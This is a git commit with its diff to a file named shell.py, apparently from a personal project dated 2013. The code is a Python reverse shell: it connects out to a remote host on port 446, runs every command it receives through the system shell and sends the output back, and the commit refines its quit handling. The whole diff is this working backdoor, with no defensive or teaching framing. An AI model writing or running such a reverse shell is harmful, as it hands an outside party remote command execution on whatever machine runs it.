f37f37273493b8af552ecf626f0d49f56619a948
stejp96 <stejp96@gmail.com>
2013-07-05 23:48:24 +0200

    Improved code

--- shell.py
+++ shell.py
@@ -8,13 +8,16 @@ PORT = 446
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.connect((HOST, PORT))
-s.send("Hello World!")
+s.send("Connection established\n")
 
 while True:
     data = s.recv(1024)
-    if data == "quit ": s.send("ddasdas")
-    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    stdoutput = proc.stdout.read() + proc.stderr.read()
-    s.send(stdoutput)
+    if data == "quit\n": break
+    else:
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        stdoutput = proc.stdout.read() + proc.stderr.read()
+        s.send(stdoutput)
 
+s.send("Qutting current session\n")
 s.close()
+quit()
